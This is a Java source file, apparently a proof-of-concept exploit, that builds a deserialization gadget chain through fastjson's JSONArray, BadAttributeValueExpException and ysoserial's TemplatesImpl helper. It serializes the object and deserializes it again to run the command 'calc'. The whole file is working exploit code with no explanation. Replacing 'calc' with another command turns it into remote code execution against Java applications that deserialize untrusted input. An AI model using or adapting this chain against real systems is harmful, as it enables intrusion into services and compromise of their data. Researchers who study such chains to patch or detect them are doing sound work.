import com.alibaba.fastjson.JSONArray;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Exp {
    public static void main(String[] args) throws Exception {
        Object template = Gadgets.createTemplatesImpl("calc");

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field declaredField = badAttributeValueExpException.getClass().getDeclaredField("val");
        Reflections.setAccessible(declaredField);
        declaredField.set(badAttributeValueExpException, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
